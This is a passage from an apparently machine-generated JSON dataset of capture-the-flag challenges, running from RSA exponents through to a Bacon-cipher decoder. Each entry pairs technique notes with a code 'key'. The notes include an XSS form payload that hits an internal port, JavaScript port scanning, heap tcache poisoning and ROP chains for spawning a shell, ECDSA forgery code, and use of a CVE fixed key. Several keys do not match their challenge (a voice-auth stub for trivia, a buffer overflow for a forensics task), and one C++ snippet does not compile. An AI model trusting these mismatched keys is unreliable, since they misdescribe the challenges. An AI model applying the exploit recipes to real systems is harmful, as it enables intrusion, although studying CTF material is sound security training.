            "To solve challenges involving RSA public and private exponents shared across multiple moduli, ensure that the Euler's totient function (phi) for one modulus is a multiple of another's. This can be achieved by carefully selecting primes for each modulus so that phi values are multiples of each other. This guarantees that a valid exponent pair (`e`, `d`) for the largest phi will also be valid for the smaller ones. Suitable primes can be generated by multiplying a base prime by a factor and adding one until a prime is found, ensuring the condition on phi values is met.",
            "When needing to generate a valid public and private exponent pair (`e`, `d`) that satisfies the RSA equation `e * d = 1 + k * phi(n)` for a given modulus `n`, where `phi(n)` is known, one can find `e` and `d` by factoring `1 + phi(n)`. Tools like FactorDB can assist in this process. The factored numbers can then be examined to select a pair that fits the requirement, taking into consideration any additional constraints such as the size or value ranges of `e` and `d`."
        ],
        "key": "```python\ndef die(*args):  \n pr(*args)  \n quit()\n\ndef pr(*args):  \n s = \" \".join(map(str, args))  \n sys.stdout.write(s + \"\\n\")  \n sys.stdout.flush()\n\ndef sc():  \n return sys.stdin.readline().strip()\n\ndef main():  \n border = \"+\"  \n pr(border*72)  \n pr(border, \" hi talented cryptographers, the mission is to find the three RSA\n\", border)  \n pr(border, \" modulus with the same public and private exponent! Try your\nchance!\", border)  \n pr(border*72)\n\n nbit = 160\n\n while True:  \n   pr(\"| Options: \\n|\\t[S]end the three nbit prime pairs \\n|\\t[Q]uit\")  \n   ans = sc().lower()  \n   order = ['first', 'second', 'third']  \n   if ans == 's':  \n     P, N = [], []  \n     for i in range(3):  \n       pr(\"| Send the \" + order[i] + \" RSA primes such that nbit >= \" + str(nbit) + \": p_\" + str(i+1) + \", q_\" + str(i+1) + \" \")  \n       params = sc()  \n       try:  \n         p, q = params.split(',')  \n         p, q = int(p), int(q)  \n       except:  \n         die(\"| your primes are not valid!!\")  \n       if isPrime(p) and isPrime(q) and len(bin(p)[2:]) >= nbit and len(bin(q)[2:]) >= nbit:  \n         P.append((p, q))  \n         n = p * q  \n         N.append(n)  \n       else:  \n         die(\"| your input is not desired prime, Bye!\")  \n     if len(set(N)) == 3:  \n       pr(\"| Send the public and private exponent: e, d \")  \n       params = sc()  \n       try:  \n         e, d = params.split(',')  \n         e, d = int(e), int(d)  \n       except:  \n         die(\"| your parameters are not valid!! Bye!!!\")  \n       phi_1 = (P[0][0] - 1)*(P[0][1] - 1)  \n       phi_2 = (P[1][0] - 1)*(P[1][1] - 1)  \n       phi_3 = (P[2][0] - 1)*(P[2][1] - 1)  \n       if 1 < e < min([phi_1, phi_2, phi_3]) and 1 < d < min([phi_1, phi_2, phi_3]):  \n         b = (e * d % phi_1 == 1) and (e * d % phi_2 == 1) and (e * d % phi_3 == 1)  \n         if b:  \n           die(\"| You got the flag:\", FLAG)  \n         else:  \n           die(\"| invalid exponents, bye!!!\")  \n       else:  \n         die(\"| the exponents are too small or too large!\")  \n     else:  \n       die(\"| kidding me?!!, bye!\")  \n   elif ans == 'q':  \n     die(\"Quitting ...\")  \n   else:  \n     die(\"Bye ...\")\n\nif __name__ == '__main__':  \n main()  \n```"
    },
    {
        "name": "Trivia 1",
        "write_up": "dataset/raw/Trivia 1.md",
        "type": "misc",
        "competition": [
            "BSidesSF/2019",
            "https://ctftime.org/event/753/tasks/"
        ],
        "score": 2,
        "max_score": 666,
        "difficulty": 0.003003003003003003,
        "knowledge": [
            "Knowledge of cultural or historical references can be useful in CTF challenges, especially in trivia or miscellaneous categories. Understanding these references can provide insights or direct answers to the challenges. For example, knowing key phrases or quotes from movies, books, or history that are related to technology or cybersecurity can be directly used to solve puzzles.",
            "Knowledge of key figures and their contributions to the field of computer science or cybersecurity is important. This can include knowing the creators of significant tools, operating systems, or algorithms. For instance, knowing who created Linux can be the direct answer to trivia questions in CTF competitions."
        ],
        "key": "```python\ndef authenticate_user(voice_input):\n    stored_voice_signature = \"user's stored voice signature\"\n    if voice_input == stored_voice_signature:\n        return \"Access Granted\"\n    else:\n        return \"Access Denied\"\n\n# Vulnerability: The voice authentication is based on simple string comparison,\n# which can be easily bypassed if the stored voice signature is known.\n```"
    },
    {
        "name": "Trunc",
        "write_up": "dataset/raw/Trunc.md",
        "type": "crypto",
        "competition": [
            "ASIS/2019/Finals",
            "https://ctftime.org/event/805/tasks/"
        ],
        "score": -1.0,
        "max_score": 477,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving ECDSA-based signature schemes where nonce generation is biased or predictable, signatures for a known message can be manipulated to forge signatures for another message by exploiting the relationship between message hashes and signature components. If \\(h_1\\) is the hash of any chosen message \\(m_1\\), \\(h_2\\) is the hash for a target message \\(m_2\\), and \\((u_1, v_1, s_1)\\) is a valid signature for \\(h_1\\), then a valid signature for \\(h_2\\) can be crafted as \\((u_1, v_1m, s_1m)\\) where \\(m = h_2 \\cdot h_1^{-1} \\mod n\\). This technique is applicable under conditions where nonce-related weaknesses in the signature generation process exist.",
            "For the ECDSA signature scheme, when tasked with forging a signature for a specific message without directly signing it, first find a message \\(m_1\\) that you can sign, calculate its hash \\(h_1\\), and do the same for the target message \\(m_2\\) to obtain \\(h_2\\). Compute the multiplier as \\(m = h_2 \\cdot h_1^{-1} \\mod n\\), where \\(n\\) is the curve order. If \\((u_1, v_1, s_1)\\) is the signature for \\(m_1\\), the signature \\((u_1, v_1 \\cdot m \\mod n, s_1 \\cdot m \\mod n)\\) will validate for \\(m_2\\). This knowledge allows exploitation of nonce reuse or predictability issues in ECDSA without requiring direct access to the private key or nonce.\n\nExample payload to manipulate signatures based on explained vulnerability:\n```python\n# Python snippet to calculate forged signature components for the target message\nn = SECP256k1.order\nh1 = int(sha256(b'your_message').hexdigest(), 16)\nh2 = int(sha256(b'target_message').hexdigest(), 16)\nm = h2 * pow(h1, -1, n) % n  # Computing the multiplier\nu2, v2, w2 = u1, v1 * m % n, w1 * m % n  # Forging the signature for the target message\n```\nThis snippet assumes you have a valid signature \\((u1, v1, w1)\\) for your chosen message and calculates the necessary components to forge a signature for the target message using the calculated multiplier \\(m\\)."
        ],
        "key": "```python  \ndef sign(msg, keypair):  \n   nbit, dbit = 256, 25  \n   pubkey, privkey = keypair  \n   privkey_bytes = long_to_bytes(privkey)  \n   x = int(sha256(privkey_bytes).hexdigest(), 16) % 2**dbit  \n   while True:  \n       k, l = [(getRandomNBitInteger(nbit) << dbit) + x for _ in '01']  \n       u, v = (k * G).x(), (l * G).y()  \n       if u + v > 0:  \n           break  \n   h = int(sha256(msg).hexdigest(), 16)  \n   s = inverse(k, n) * (h * u - v * privkey) % n  \n   return (int(u), int(v), int(s))\n```"
    },
    {
        "name": "Truncated form",
        "write_up": "dataset/raw/Truncated form.md",
        "type": "crypto",
        "competition": [
            "ASIS/2019/Finals",
            "https://ctftime.org/event/805/tasks/"
        ],
        "score": 208,
        "max_score": 477,
        "difficulty": 0.4360587002096436,
        "knowledge": [
            "In challenges involving prime manipulation and transformation into a specific format, factorization plays a crucial role. To handle large numbers efficiently, factor the prime number with an increment (p+i) into its prime constituents, leveraging the prime factors for further manipulation, such as calculating the primorial of a number. This step is critical in reducing the problem to a workable format and eventually finding a concise representation that meets the challenge's requirements.",
            "When tasked with generating a specific output format from a prime number, iterating over a range of numbers to adjust the prime (p+i) can be an effective strategy. This adjustment facilitates factorization and subsequent operations that involve prime numbers and their primorials. Moreover, incorporating condition checks to ensure that resulting expressions or transformations are within a specified length or format criteria can streamline the process of arriving at the correct solution. Implementing a check to compare the length of the result against a target length ensures that the solution not only satisfies the mathematical requirements but also adheres to format constraints imposed by the challenge.\n\nSample Payload/Output Generation Logic:\n```python\nresult = str(a) + \"*\" + str(x) + \"#/\" + str(divisor) + \"-\" + str(i)\nif len(result) <= 29:\n   return result\n```"
        ],
        "key": "```python\ndef solve(p, primes):  \n   best = 0  \n   for i in long_range(0, 999999999):  \n       factors, res = factor_p(p + i, primes)  \n       factors += [res]  \n       for j in range(len(factors)):  \n           x = factors[j]  \n           if x >= primes[-1]:  # skip last large factor  \n               break  \n           primo = primorial(x, False)  \n           divisor = 1  \n           for prime in primes:  \n               if prime > x:  \n                   break  \n               if prime not in factors:  \n                   divisor *= prime  \n           c = primo / divisor  \n           if divisor > p:  \n               continue  \n           a = (p + i) / c  \n           if (a * primorial(x, False) / divisor - i) != p:  \n               break  \n           result = str(a) + \"*\" + str(x) + \"#/\" + str(divisor) + \"-\" + str(i)  \n           if len(result) <= 29:  \n               return result  \n   return best  \n```"
    },
    {
        "name": "Trusted Cloud 1",
        "write_up": "dataset/raw/Trusted Cloud 1.md",
        "type": "The type of challenge is forensics.",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "When analyzing disk images, especially those related to Linux systems, encountering LUKS-encrypted partitions should prompt the inspection of any associated TPM (Trusted Platform Module) network captures for potential decryption keys. The TPM2 protocol, particularly commands like TPM2_CC_Unseal, can contain the decryption key required to access encrypted volumes. To extract the key from network captures, tools like Wireshark can be used to dissect TPM2 protocol communication, identifying the response parameters of the TPM2_CC_Unseal request to obtain the key.",
            "If a decryption key is obtained from TPM2 protocol analysis, it may be encoded in a format such as base64 before being used by system utilities like systemd's cryptsetup for LUKS volume management. Therefore, converting the extracted key to base64 format is essential before attempting to mount and access the encrypted partition. This approach can be particularly effective in scenarios where the system relies on TPM for secure key storage and measured boot processes. \n\n   - **Example of decoding and using the key**: \n     - Extracted key: `0020d57256b7127609a08607f99d6a0b9ff12af45c1c01f7b14322248bfc8072a3d5`\n     - Convert to base64: `echo -n '0020d57256b7127609a08607f99d6a0b9ff12af45c1c01f7b14322248bfc8072a3d5' | xxd -r -p | base64`\n     - The output, which is `1XJWtxJ2CaCGB/mdaguf8Sr0XBwB97FDIiSL/IByo9U=`, would then be used as the passphrase for opening the LUKS volume."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[64];\n    strcpy(buffer, input); // Vulnerable to buffer overflow\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s <input>\\n\", argv[0]);\n        return 1;\n    }\n    vulnerable_function(argv[1]);\n    return 0;\n}\n```"
    },
    {
        "name": "Trusted Cloud 2",
        "write_up": "dataset/raw/Trusted Cloud 2.md",
        "type": "reverse",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When dealing with encrypted data using TPM (Trusted Platform Module) and running into issues with software dependencies or inability to directly interact with the TPM due to connection issues (e.g., wrong or missing ports), it's possible to work around by modifying the source code of the TPM interaction library to bypass connection checks. In scenarios where a TPM tool refuses to work because it cannot connect to the required port, modifying the source code to return success early in the connection logic might allow further interaction with the TPM. For example, adding `return TSS2_RC_SUCCESS;` at the start of the troublesome function. This approach allows continuation of work with the expectation that the bypassed functionality is not critical for the intended operation.",
            "In the context of decrypting data encrypted with a TPM, if the decryption script requires a password that is unknown or appears to be complex, utilizing debugging tools (such as gdb for specific architecture, e.g., RISC-V64) can reveal the actual password check mechanism and the expected value directly in the memory. This can lead to either directly bypassing the password check by manipulating the program counter during debugging or extracting the actual password hash for use. If the extracted password is a hash or a form that is not directly usable, it might be provided to the decryption tool through command-line flags like `-passin file:passwordhash` in openssl command. This method requires access to the TPM's processing or password validation mechanism, typically available within its operational library's source code or through dynamic analysis during execution.\n\nExample payload or usage: `-passin file:passwordhash` in an openssl command, assuming `passwordhash` contains the binary password hash `7740ba0e627b5d6ba2a0acf0175981504350d9d9481963d1e0bba39ce6bc773c` extracted through debugging."
        ],
        "key": "```c\nint MemoryEqual2B(const BYTE *a, const BYTE *b, size_t size) {\n    for (size_t i = 0; i < size; i++) {\n        if (a[i] != b[i]) {\n            return 0; // Not equal\n        }\n    }\n    return 1; // Equal\n}\n\nvoid CheckPWAuthSession(const BYTE *providedPassword, const BYTE *correctPassword, size_t size) {\n    if (!MemoryEqual2B(providedPassword, correctPassword, size)) {\n        // Passwords do not match\n        // Handle authentication failure\n    } else {\n        // Passwords match\n        // Proceed with decryption\n    }\n}\n```"
    },
    {
        "name": "Trusted Cloud 3",
        "write_up": "dataset/raw/Trusted Cloud 3.md",
        "type": "crypto",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When dealing with TPM and particularly the `TPM2_CC_Import` command in a CTF challenge, if you encounter encrypted data (e.g., a `duplicate` section that is the encrypted private part), and standard decryption methods fail to reveal meaningful information, consider exploring known vulnerabilities associated with the TPM version or specifications. In the context of CVE-2021-3565, the fix involved changing the encryption methodology for a key from a static value to a securely generated random number. This implies that before the fix, static or known keys were used, which could lead to a potential MITM attack vector by allowing the adversary to decrypt the imported key. This can lead to uncovering sensitive information by using the known static encryption key for decryption.\n\n   **Example Code for Decryption Using the Vulnerability:**\n   ```\n   from Crypto.Cipher import AES\n   # Using a fixed encryption key due to CVE-2021-3565\n   fixed_key = b'\\xFF'*32  # Fixed encryption key before the CVE-2021-3565 fix\n   iv_zero = b'\\0'*16  # Initialization vector is all zeros\n   cipher = AES.new(key=fixed_key, mode=AES.MODE_CFB, iv=iv_zero, segment_size=8*16)\n   decrypted_data = cipher.decrypt(bytes.fromhex('ENCRYPTED_HEX_DATA_HERE')).hex()\n   ```",
            "If an expected encryption or decryption operation within TPM does not behave as anticipated, potentially due to a security vulnerability or misinterpretation of the TPM commands and responses, reviewing the TPM's specification documents and examining existing tools (e.g., `tpm2-tools` repository for `tpm2_import`) could provide insights into the correct usage or known issues. Additionally, examining related security advisories can uncover specific vulnerabilities that could be exploited to achieve the challenge's objective, such as decrypting encrypted parts or understanding malformed or unexpected command behaviors.\n\n   **Context for Proper Use:** Before leveraging known cryptographic vulnerabilities like CVE-2021-3565 in similar scenarios, one should explore and understand the implications of such vulnerabilities on the affected cryptographic operations (e.g., key import procedures in TPM). This approach can be especially useful in scenarios where encrypted data does not decrypt as expected, suggesting the implementation may be susceptible to known issues or that specific exploitation techniques (like using known fixed keys) are necessary to proceed."
        ],
        "key": "```c\n- memset(enc_sensitive_key.buffer, 0xFF, enc_sensitive_key.size);  \n+ int ossl_rc = RAND_bytes(enc_sensitive_key.buffer, enc_sensitive_key.size);  \n```"
    },
    {
        "name": "trusted shop",
        "write_up": "dataset/raw/trusted shop.md",
        "type": "web",
        "competition": [
            "KITCTFCTF/2023",
            "https://ctftime.org/event/1965/tasks/"
        ],
        "score": 714,
        "max_score": 1000,
        "difficulty": 0.714,
        "knowledge": [
            "To exploit a server-side XSS vulnerability within a PDF generation feature, one can insert malicious JavaScript in input fields that are reflected in the PDF. This JavaScript can perform actions such as port scanning or sending requests to internal endpoints. This approach leverages the server's PDF rendering process to bypass client-side restrictions like the same-origin policy.\n   \n   Example payload for form submission triggering the XSS:\n   ```html\n   <form name=\"myForm\" id=\"myForm\" action=\"http://127.0.0.1:[PORT]/\" method=\"POST\" enctype=\"text/plain\">\n        <input name='{\"variables\":{},\"' value='\":{},\"query\":\"query{findFirstItemOrThrow(where:{id:2}){download}}\"}' />\n   </form>\n\n   <script>\n      window.onload = function(){\n        document.forms['myForm'].submit();\n      }\n   </script>\n   ```",
            "For finding the correct port of an internally running service without direct access, JavaScript-based port scanning can be employed. This method uses differences in timing of failed image loads to determine if a port is open or closed. This technique can be effective for identifying the ports of internal services that are not directly exposed but can be communicated with from other exploited services.\n\n   Example approach for internal port scanning with JavaScript:\n   ```javascript\n   var portIsOpen = function(hostToScan, portToScan, N) {\n       // Function implementation details\n   }\n\n   document.body.innerHTML = \"Starting Port Scan...\";\n   async function test() {\n       for (var i = startPort; i < endPort; i++) {\n           let [isOpen, m, sumOpen, sumClosed] = await portIsOpen('localhost', i, 10);\n           if (isOpen) {\n               document.body.innerHTML += `\\nPort ${i} open\\n`;\n           }\n       }\n   }\n\n   test();\n   ```"
        ],
        "key": "```javascript\nconst id = req.query.id || '0'  \nconst title = req.query.title || ''  \nconst email = req.query.email || ''  \nconst content = req.query.content || ''\n\nif (typeof id !== 'string' || typeof title !== 'string' || typeof email !==\n'string' || typeof content !== 'string') {  \n   return res.end(':(')  \n}\n\nconst body = pages.get('confirmation')!  \n   .replace(':title', title)  \n   .replace(':email', email)  \n   .replace(':content', content)\n\nres.end(body)  \n```"
    },
    {
        "name": "trustworthy",
        "write_up": "dataset/raw/trustworthy.md",
        "type": "pwn",
        "competition": [
            "N1CTF/2018",
            "https://ctftime.org/event/584/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges related to Windows-based vulnerabilities, the exploitation can involve impersonating user processes to bypass security checks. This is particularly effective when the application checks the identity of a connected client by enumerating threads in the client process and uses the `AccessCheck` function against a specific security descriptor. In such scenarios, the Service-for-User (S4U) mechanism can be utilized to obtain an IdentificationLevel impersonation token, effectively bypassing the intended security measures.",
            "When dealing with Windows application security, especially in scenarios where file access permissions are involved, it is crucial to understand the role of thread and process tokens in access control. Windows uses Access Tokens to store the security context of a user account, which are then utilized by the operating system to perform access checks. If an application uses `AccessCheck` to validate access permissions against security descriptors (e.g., a file like `C:\\token.txt`), manipulating the token associated with a thread or process can be a viable attack vector. This approach may require deep understanding of Windows security mechanisms, including primary tokens and impersonation tokens."
        ],
        "key": "```cpp\n#include <windows.h>\n#include <sddl.h>\n\nBOOL CheckClientAccess(HANDLE hClientProcess) {\n    HANDLE hToken = NULL;\n    HANDLE hThread = NULL;\n    DWORD dwThreadId = 0;\n    BOOL bAccessGranted = FALSE;\n    PSECURITY_DESCRIPTOR pSD = NULL;\n    PACL pDacl = NULL;\n    DWORD dwSize = 0;\n\n    // Get the security descriptor for C:\\token.txt\n    if (!ConvertStringSecurityDescriptorToSecurityDescriptor(\n            \"D:(A;;FA;;;WD)\", SDDL_REVISION_1, &pSD, &dwSize)) {\n        goto Cleanup;\n    }\n\n    // Get the DACL from the security descriptor\n    if (!GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pDacl, &bDaclDefaulted)) {\n        goto Cleanup;\n    }\n\n    // Enumerate threads in the client process\n    hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, dwThreadId);\n    if (hThread == NULL) {\n        goto Cleanup;\n    }\n\n    // Open the token for the thread\n    if (!OpenThreadToken(hThread, TOKEN_QUERY, TRUE, &hToken)) {\n        // If no thread token, use the primary token\n        if (!OpenProcessToken(hClientProcess, TOKEN_QUERY, &hToken)) {\n            goto Cleanup;\n        }\n    }\n\n    // Perform access check\n    PRIVILEGE_SET PrivilegeSet;\n    DWORD dwPrivilegeSetSize = sizeof(PRIVILEGE_SET);\n    DWORD dwGrantedAccess = 0;\n    BOOL bAccessStatus = FALSE;\n\n    if (!AccessCheck(pSD, hToken, GENERIC_READ, &GenericMapping, &PrivilegeSet,\n                     &dwPrivilegeSetSize, &dwGrantedAccess, &bAccessStatus)) {\n        goto Cleanup;\n    }\n\n    bAccessGranted = bAccessStatus;\n\nCleanup:\n    if (hToken) {\n        CloseHandle(hToken);\n    }\n    if (hThread) {\n        CloseHandle(hThread);\n    }\n    if (pSD) {\n        LocalFree(pSD);\n    }\n    return bAccessGranted;\n}\n```"
    },
    {
        "name": "tudutudututu",
        "write_up": "dataset/raw/tudutudututu.md",
        "type": "reverse",
        "competition": [
            "nullconHackIM/2019",
            "https://ctftime.org/event/741/tasks/"
        ],
        "score": 495,
        "max_score": 500,
        "difficulty": 0.99,
        "knowledge": [
            "When dealing with alphanumeric shellcode constraints, such as in scenarios where the payload must only contain alphanumeric characters and a control over certain registers like `rax` is needed at runtime, utilizing small snippet injections (like `push r12; pop rax`) can effectively manipulate register values to prepare for the shellcode execution. This technique leverages the fact that pushing a register value onto the stack and immediately popping it into another register allows for the transfer of values between registers without using non-alphanumeric bytes. Additionally, understanding the precise memory layout and register state at the time of shellcode execution (e.g., ensuring `rax + padding_length == shellcode_address`) is crucial for the successful execution of such payloads.\n   - Example payload: `push r12; pop rax;`",
            "In challenges involving Use-After-Free (UAF) and double free vulnerabilities, especially with libc version 2.27 where tcache is implemented, poisoning the tcache list can allow an attacker to gain arbitrary code execution by allocating chunks over critical structures like `__free_hook`. This involves carefully orchestrated malloc and free calls to manipulate the tcache entry to point to a controlled location. Once `__free_hook` is overwritten with the address of a gadget or function like `system`, executing a free on a controlled chunk containing command strings such as \"/bin/sh\" can leverage the system call to spawn a shell.\n   - Due to the complexity and specificity of these attacks based on heap manipulation techniques and the libc version, generating a one-fit-all example payload here is not feasible. However, the concept revolves around:\n     1. Leaking libc addresses to bypass ASLR.\n     2. Crafting fake chunks or manipulating tcache to control `__free_hook`.\n     3. Overwriting `__free_hook` with the address of `system`.\n     4. Triggering the free of a chunk containing a command to execute."
        ],
        "key": "```c\nif ( (char)uint8 > 20 )  \n{  \n perror(\"Coins that many are not supported :/\\r\\n\");  \n exit(1);  \n}  \nfor ( i = 0; i < uint8; ++i )  \n{  \n v6 = &v10[4 * i];  \n _isoc99_scanf((__int64)\"%d\", (__int64)v6);  \n}\n```"
    },
    {
        "name": "Turbo Blaise",
        "write_up": "dataset/raw/Turbo Blaise.md",
        "type": "reverse",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 443,
        "max_score": 497,
        "difficulty": 0.8913480885311871,
        "knowledge": [
            "When dealing with MS-DOS executables in reverse engineering challenges, particularly those that are obfuscated, closely examining assembly instructions for operations like comparisons and jumps can reveal important clues about input validation mechanisms. In scenarios where the executable is analyzing user input, such as password or command validation, instructions that compare stored or input values to a specific length or character set can often indicate how the input is being processed or validated. In this case, examining the assembly code helped identify how the password's length and content were being verified, leading to the discovery of password handling logic.",
            "For challenges involving obfuscated code where strings or passwords are verified or manipulated, using dynamic analysis techniques like setting breakpoints on critical instructions can help uncover the logic and values being compared or manipulated at runtime. Once the location and format of input data in memory are identified (e.g., Pascal strings in this MS-DOS challenge), manipulating the input to analyze changes in program behavior can further reveal the logic applied to the input data. This approach was key to identifying how buffers were xored together to check against a third buffer, ultimately revealing the mechanism to find the correct password. A practical application of this method involves using a debugger to dynamically examine and manipulate the memory and registers to track how input affects program flow.\n\nExample payload creation steps based on the challenge's context:\n- Identify buffers and their roles by setting breakpoints on comparison instructions.\n- Manipulate input values and observe changes in behavior or error messages to narrow down the correct format or length.\n- Use the identified logic (e.g., xoring buffers) to craft a payload that meets the validation requirements. In this scenario, the crafted payload was the correct password, `digital-modest-mentor`, discovered by xor-ing the identified buffers."
        ],
        "key": "```c\nMOV AL, [0xe02]\nXOR AH, AH\nMOV DI, AX\nMOV CL, byte ptr [DI + 0x7e1]\n\nMOV AL, [0xe02]\nXOR AH, AH\nMOV DI, AX\nMOV DL, byte ptr [DI + 0xd02]\n\nMOV AL, [0xe02]\nXOR AH, AH\nMOV DI, AX\nMOV AL, byte ptr [DI + 0xc02]\n\nXOR AL, DL\nCMP AL, CL\nJZ  LAB_1000_015e\n```"
    },
    {
        "name": "turtles",
        "write_up": "dataset/raw/turtles.md",
        "type": "pwn",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 250,
        "max_score": 1285,
        "difficulty": 0.19455252918287938,
        "knowledge": [
            "In scenarios where the application allows writing arbitrary bytes to an object's memory location, it's possible to exploit Objective-C applications by overwriting the object's class pointers. This can lead to manipulating the message lookup mechanism (`objc_msg_lookup`) in Objective-C to redirect execution flow to an attacker-controlled area in memory, allowing for injection of malicious payloads. This method relies on understanding the memory layout of Objective-C objects and classes, specifically that the class pointer is stored at offset 0x00 of the instance, and the pointer to the implementation table is at offset 0x40 of the class object.",
            "For constructing successful ROP (Return-Oriented Programming) chains in exploitation scenarios, leaked addresses from the application (e.g., by using `printf` to leak a GOT entry) can be used to calculate the base address of libc. This allows an attacker to accurately predict the location of libc functions such as `system`, facilitating arbitrary code execution by calling system with a controlled string (e.g., \"/bin/sh\") to gain a shell. This technique typically involves a staged payload where the first stage leaks necessary addresses and the second stage executes the desired system call.\n\nStage 1 ROP-chain example:\n```py\nrop.raw(rop_rdi)  \nrop.raw(turtle + base_data)\nrop.raw(rop_rsi_r15)  \nrop.raw(setvbuf_got)  \nrop.raw(0)\nrop.raw(printf_plt)  \nrop.raw(main_addr)\n```\n\nStage 2 ROP-chain example:\n```py\nrop.raw(rop_rdi)  \nrop.raw(turtle + base_data)  \nrop.raw(libc.symbols[b\"system\"])\n```"
        ],
        "key": "```objc  \n#include <stdio.h>  \n#include <unistd.h>  \n#include <string.h>  \n#include <Foundation/NSObject.h>  \n#include <Foundation/NSString.h>\n\n@interface Turtle: NSObject  \n- (void) say: (NSString *) phrase;  \n@end\n\n@implementation Turtle: NSObject  \n- (void) say: (NSString *) phrase  \n{  \n   NSLog(@\"%@\\n\", phrase);  \n}  \n@end\n\nint main(int argc, char ** argv) {  \n   char buf[0x810];\n\n   setvbuf(stdout, NULL, _IONBF, 0);  \n   setvbuf(stdin, NULL, _IONBF, 0);\n\n   Turtle * turtle = [[Turtle alloc] init];  \n  \n   printf(\"Here is a Turtle: %p\\n\", turtle);\n\n   read(STDIN_FILENO, buf, sizeof buf);  \n   memcpy(turtle, buf, 200);\n\n   [turtle say: @\"I am a turtle.\"];  \n   [turtle release];\n\n   return 0;  \n}  \n```"
    },
    {
        "name": "Twenty-five",
        "write_up": "dataset/raw/Twenty-five.md",
        "type": "crypto",
        "competition": [
            "Harekaze/2019",
            "https://ctftime.org/event/789/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "In challenges involving obfuscated code, especially when the obfuscation is done using a language's reserved words, one effective approach is to deobfuscate by replacing identified characters back to their original form based on a cipher key. This is particularly feasible when the obfuscation resembles a simple substitution cipher (monoalphabetic replacement). After identifying unique letter combinations and using a relevant word bank or list of reserved words for decryption, one can reconstruct the original code or message.  \n   Example approach: Use a word bank to match unique letter patterns in the obfuscated code, then systematically replace obfuscated characters with their original counterparts based on this analysis.",
            "In scenarios where a script (e.g., a Perl script) evaluates obfuscated text, modifying the script to firstly display rather than immediately execute the obfuscated code could provide insights into the obfuscation technique or reveal the cipher used. This step becomes a crucial preliminary analysis stage that allows for a safer and more controlled deobfuscation process without directly executing potentially harmful code.  \n   Example modification (to a Perl script for instance): Replace `eval($text);` with `print($text);`, enabling the researcher to view the obfuscated code first, thus identifying the obfuscation pattern or cipher before executing any code."
        ],
        "key": "```perl\nuse open qw/:utf8/;\n\nopen(my $F, \"<:utf8\", 'crypto.txt') or die;  \nmy $text;  \nwhile (my $l = <$F>)  \n{  \n $l =~ s/[\\r\\n]+/ /g;  \n $text .= $l;  \n}  \nclose($F);\n\n$text =~ y/abcdefghijklmnopqrstuvwxy/tbwiupohdnvrsyqlkmaxfjcge/;\n\nprint($text);  \neval($text);  \n```"
    },
    {
        "name": "Twice As Secret, Right_ 922",
        "write_up": "dataset/raw/Twice As Secret, Right_ 922.md",
        "type": "crypto",
        "competition": [
            "AUCTF/2020",
            "https://ctftime.org/event/1020/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When encountering audio files in CTF challenges, one possible step is to analyze the file for morse code. This can be effectively accomplished using online Morse code decoders that can process audio files. These tools can translate the audio signals into alphanumeric characters if the audio contains Morse code signals.\n   - Example tool: https://morsecode.world/international/decoder/audio-decoder-adaptive.html",
            "If a straightforward translation of an intercepted message does not reveal a clear message or flag, consider the possibility of a cipher encoding. Specifically, for messages encoded on 5 characters (or any fixed length), the Bacon cipher is a potential method used for encoding. The length of the encoded message can provide a clue towards this cipher. Online tools can assist in decoding messages encrypted with the Bacon cipher.\n   - Example tool for decoding Bacon cipher: https://www.dcode.fr/bacon-cipher"
        ],
        "key": "```python\ndef bacon_cipher_decode(encoded_message):\n    bacon_dict = {\n        'AAAAA': 'A', 'AAAAB': 'B', 'AAABA': 'C', 'AAABB': 'D', 'AABAA': 'E',\n        'AABAB': 'F', 'AABBA': 'G', 'AABBB': 'H', 'ABAAA': 'I', 'ABAAB': 'J',\n        'ABABA': 'K', 'ABABB': 'L', 'ABBAA': 'M', 'ABBAB': 'N', 'ABBBA': 'O',\n        'ABBBB': 'P', 'BAAAA': 'Q', 'BAAAB': 'R', 'BAABA': 'S', 'BAABB': 'T',\n        'BABAA': 'U', 'BABAB': 'V', 'BABBA': 'W', 'BABBB': 'X', 'BBAAA': 'Y',\n        'BBAAB': 'Z'\n    }\n    \n    decoded_message = \"\"\n    for i in range(0, len(encoded_message), 5):\n        chunk = encoded_message[i:i+5]\n        if chunk in bacon_dict:\n            decoded_message += bacon_dict[chunk]\n        else:\n            decoded_message += '?'\n    \n    return decoded_message\n\nencoded_message = 